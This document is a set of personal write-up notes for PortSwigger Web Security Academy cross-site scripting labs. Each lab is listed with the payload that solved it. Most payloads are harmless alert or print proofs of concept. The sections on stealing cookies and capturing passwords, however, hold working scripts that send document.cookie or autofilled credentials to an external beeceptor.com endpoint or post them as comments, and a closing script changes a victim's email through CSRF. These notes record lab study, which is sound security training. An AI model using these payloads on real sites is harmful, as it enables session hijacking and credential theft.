Ania Pirogowicz
# XSS

- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://portswigger.net/web-security/cross-site-scripting/contexts

## Reflected XSS into HTML context with nothing encoded

```
?search=<script>alert(document.domain)</script>
```

## Stored XSS into HTML context with nothing encoded

In the leaving post commet functionality, the comment body is vulnerable:

```
<script>alert(document.domain)</script>Comment
```

## DOM XSS in document.write sink using source location.search

```
?search="+onload%3Dalert%28document.domain%29+x%3D"  // Without encoding: " onload=alert(document.domain) x="
```

## DOM XSS in innerHTML sink using source location.search

```
?search=<img+src%3D"X"+onerror%3Dalert%28document.domain%29>  // Without encoding: <img src="X" onerror=alert(document.domain)>
```

## DOM XSS in jQuery anchor href attribute sink using location.search source

```
/feedback?returnPath=javascript:alert(document.cookie)
```

## DOM XSS in jQuery selector sink using a hashchange event

On appending to URL this payload the XSS triggers via creating provided `img` element by jQuery handler `$()`:
```
#<img src=X onerror=print()>
```

Deliver to victim:
```
<iframe src='https://0a0d00c00320c7a8868f0d22007000ee.web-security-academy.net/#' onload="this.src+='<img src=X onerror=print()>'"></iframe>
```

## Reflected XSS into attribute with angle brackets HTML-encoded

```
?search=" autofocus onfocus=alert(document.domain) x="
```

## Stored XSS into anchor href attribute with double quotes HTML-encoded

Create a post with `Website` parameter equal to:
```
javascript:alert(document.domain)
```
or to:
```
javascript:print()
```
It is injected into `href` tag later

## Reflected XSS into a JavaScript string with angle brackets HTML encoded

Characters `'` are not encoded by 
```
?search='; alert(1); var x='
```

## DOM XSS in document.write sink using source location.search inside a select element

```
/product?productId=2&storeId=</option></select><img src=X onerror=alert(1)>
```

## DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

`ng-app` attr in body

Search for `{{2+2}}` retrieves with `{{2+2}}` in page source, but on website is visible as `4`, because of `ng-app` which executes this.

```
{{$on.constructor('alert(1)')()}}

{{$eval.constructor('alert(1)')()}}
```

The only thing we care about is to get to `Function` constructor, create function with it and call it. Since `$eval` and `$on` are functions in scope of angular we can use them.

## Reflected DOM XSS

Search:
```
\"}; alert(1); // -
```

Search term is passed with result to eval function

## Stored DOM XSS

Escaping function:
```
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```

Testing this:
```
"<><><>".replace('<', '&lt;').replace('>', '&gt;')
```

Results in:
```
"&lt;&gt;<><>"
```

Create a comment with body:
```
<><img src=X onerror=alert(document.domain)>
```

## Reflected XSS into HTML context with most tags and attributes blocked

Fuzz all posiible tags, to test which one could be used. `<body>` and custom tags (like for eg. `<xss>`) are accepted.

Fuzz all possible events. `onresize` is accepted.

It turns out that new body is not injected, but the main one inherits the attributes of the new one. So searching for `<body onresize=print()></body>` will add `onresize=print()` to main body.

Deliver with body:
```
<iframe src=https://0ac9008903e8dd708000c1ac00020078.web-security-academy.net/?search=%3cbody+onresize%3dprint()%3e%3c%2fbody%3e onload=this.style.width="100px"></iframe>
```

## Reflected XSS into HTML context with all tags blocked except custom ones

XSS with custom tag:
```
<xss autofocus tabindex=1 onfocusin=alert(document.cookie) style="display: block">a</xss>
```

Deliver body:
```
<script>
    location = "https://0a66005c0464b19d8b41541a007d004d.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocusin%3Dalert%28document.cookie%29+style%3D%22display%3A+block%22%3Ea%3C%2Fxss%3E"
</script>
```

## Reflected XSS with some SVG markup allowed

Fuzz all posiible tags, to test which one could be used. `<svg>`, `<animatetransform>`, `<title>`, `<image>` are accepted.

Fuzz all possible events for `<svg><animatetransform>`. `onbegin` is accepted.

Payload
```
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

## Reflected XSS in canonical link tag

On adding `?'accesskey='x'onclick='alert(1)` to the URL, the canonical link reflects this change:
```
<link rel="canonical" href='https://0a4c00fe04e52b82813cdf9400c1005e.web-security-academy.net/?'accesskey='x'onclick='alert(1)'/>
```

This will cause to trigger `onclick` event on `Chrome` when shortcut are applied:
 - On Windows: `ALT+SHIFT+X`
 - On MacOS: `CTRL+ALT+X`
 - On Linux: `Alt+X`

## Reflected XSS into a JavaScript string with single quote and backslash escaped

Entering `</script>` breaks the original `<script>` tag.

Final payload:
```
</script><script>alert(document.domain)</script>
```

## Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

`\` are not escaped, but `'` are. So injecting `\'` turns into `\\'` which lets us escape the sctring in `<script>` context

```
\';alert(1)//
```

## Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

When the browser has parsed out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any further.

Content of onclick event is URL decoded on run, so string can be scaped using `&apos;`

```
http://JKDSFKDSF_WEBSITE&apos;); alert(1); //
```

## Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

Check what values are geting encoded:
```
JKSDFHSUD_SEARCH { } $ & - / \ ' " - +
```

`${2+2}` results in `4` because the injected payload is in js string template.

```
${alert(1)}
```

## Exploiting cross-site scripting to steal cookies

Comment body is vuln to XSS.

First solution using https://beeceptor.com/ (blocked by Burp WAF probably)
[NOTE FROM THE FUTURE: Maybe Exploit Server with Access logs could have been used]

```
<script>
    fetch('https://aaaaaa.free.beeceptor.com?q=' + document.cookie, {mode: 'no-cors'})
</script>
```

Alternative solution. Create comment with body:
```
<script>
window.addEventListener("load", ()=>{
    var csrf = document.querySelector("form input[name='csrf']").value;
    fetch("https://0a0500a9039dbb1a8057b2d0001d00ed.web-security-academy.net/post/comment", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: 'csrf='+csrf+'&postId=1&comment='+encodeURIComponent(btoa(document.cookie))+'&name=Admin&email=email@email.com&website=http://example.com'
    })
}) 
</script>
```

Then read the token of impersonated user from `postId = 1`

## Exploiting cross-site scripting to capture passwords

The goal here is to steal password that will be autofilled by browser / password managers in this website.

First solution using https://beeceptor.com/ (blocked by Burp WAF probably)
[NOTE FROM THE FUTURE: Maybe Exploit Server with Access logs could have been used] 

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://bbbbbb.free.beeceptor.com?q=' + username.value+':'+this.value,{
method:'GET',
mode: 'no-cors',
});">
```

(`mode: 'no-cors'` limits possible headers which will be added to the request and may not allow accessing the response value)

Alternative solution. Create comment with body:

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://0afa00a0040eb1438c49639400ff00d8.web-security-academy.net/post/comment', {
method: 'POST',
headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
},
body: 'csrf='+document.querySelector('form input[name=\'csrf\']').value+'&postId=1&comment='+encodeURIComponent(btoa(username.value+'~'+this.value))+'&name=Admin&email=email@email.com&website=http://example.com'
});">
```

Then read the username and password of impersonated user from `postId = 1`

## Exploiting XSS to perform CSRF

```
<script>
window.addEventListener("load", ()=>{
    var csrf = document.querySelector("form input[name='csrf']").value;
    fetch("https://0a5b0051036b221b80115357002200c1.web-security-academy.net/my-account/change-email", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: 'csrf='+csrf+'&email=email@email.com'
    })
}) 
</script>
```
